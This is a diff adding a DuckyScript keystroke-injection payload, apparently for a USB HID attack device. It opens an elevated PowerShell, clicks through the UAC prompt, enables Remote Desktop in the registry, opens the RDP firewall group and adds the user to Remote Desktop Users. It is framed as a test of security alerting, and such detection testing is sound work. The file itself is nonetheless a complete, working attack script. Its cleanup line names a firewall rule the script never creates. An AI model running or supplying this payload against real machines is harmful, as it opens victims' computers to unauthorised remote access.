@@ -1,0 +1,22 @@
+REM ============================================================
+REM  Windows · Enable RDP + Add Firewall Rule
+REM ============================================================
+REM  Enables Remote Desktop and opens port 3389 in Windows
+REM  Firewall. For testing whether unauthorized RDP enablement
+REM  triggers security alerts.
+REM
+REM  Requires admin. Clean up: Disable-NetFirewallRule -Name "RDP-In"
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+STRINGLN Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
+STRINGLN Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+STRINGLN net localgroup "Remote Desktop Users" $env:USERNAME /add
+STRINGLN exit
